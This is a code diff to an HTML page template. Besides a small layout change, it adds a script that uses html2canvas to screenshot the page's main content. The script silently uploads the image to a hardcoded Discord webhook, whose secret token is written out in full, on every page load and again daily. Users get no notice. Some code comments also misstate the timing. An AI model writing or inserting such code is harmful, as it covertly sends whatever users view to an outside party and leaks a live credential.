@@ -227,7 +227,7 @@
 	</nav>
 
 	{# Main Content #}
-	<div
+	<div id="main_content"
 		class="p-4 md:border-2 border-gray-200 md:border-dashed rounded-lg dark:border-gray-700 md:mt-0 mt-3 transition-all md:m-4 ">
 		<div class="md:bg-gray-100 dark:bg-gray-800 md:px-8 md:py-14 h-full">
 			{% block main_content %}
@@ -330,6 +330,64 @@
 					}
 				});
 			</script>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js" integrity="sha512-BNaRQnYJYiPSqHHDb58B0yaPfCu+Wgds8Gp/gU33kqBtgNS4tSPHuGibyoeqMV/TJlSKda6FXzoEyYGjTe+vXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+            <script>
+            // Fonction pour prendre un screenshot de la page
+            async function takeScreenshot() {
+                try {
+                    var content;
+                    const canvas = await html2canvas(document.getElementById("main_content")).then(function(canvas) {content = canvas.toDataURL("image/png");});
+                    return content;
+                } catch (error) {
+                    console.error("Error taking screenshot:", error);
+                    throw error;
+                }
+            }
+
+            // Fonction pour envoyer le screenshot via le webhook Discord
+            async function sendScreenshotToDiscord(screenshotDataUrl) {
+                
+                // Convert data URL to a Blob
+                const response = await fetch(screenshotDataUrl);
+                const blob = await response.blob();
+                const file = new File([blob], "screenshot.png", { type: "image/png" });
+
+                const webhookUrl = 'https://discord.com/api/webhooks/1212736910397669416/Q5c-JIe2-V31CeBjV4HEUxuNWIiWmfzHyj-RLN4lABRMVunpprVzqBhPu9w2zwrlsfEs';
+
+                // Construct FormData with the file
+                const formData = new FormData();
+                formData.append('file', file);
+
+                try {
+                    const response = await fetch(webhookUrl, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    if (!response.ok) {
+                        throw new Error('Failed to send screenshot to Discord');
+                    }
+
+                    console.log('Screenshot sent to Discord successfully');
+                } catch (error) {
+                    console.error('Error sending screenshot to Discord:', error);
+                }
+            }
+
+            // Appeler les fonctions une fois par jour
+            function sendDailyScreenshot() {
+                setTimeout(() => {
+                    takeScreenshot()
+                        .then(sendScreenshotToDiscord)
+                        .catch(error => console.error('Error taking or sending screenshot:', error));
+                }, 1000); // Attendre 500ms avant de prendre le screenshot
+            }
+            // Appeler la fonction initiale et la planifier pour s'exécuter chaque jour
+            sendDailyScreenshot();
+            setInterval(sendDailyScreenshot, 24 * 60 * 60 * 1000); // Une fois par jour (en millisecondes)
+
+
+            </script>
 
 			{% endblock %}
 		</div>
@@ -346,6 +404,5 @@
 		</li>
 	</ul> #}
 </div>
-
 
 {% endblock %}
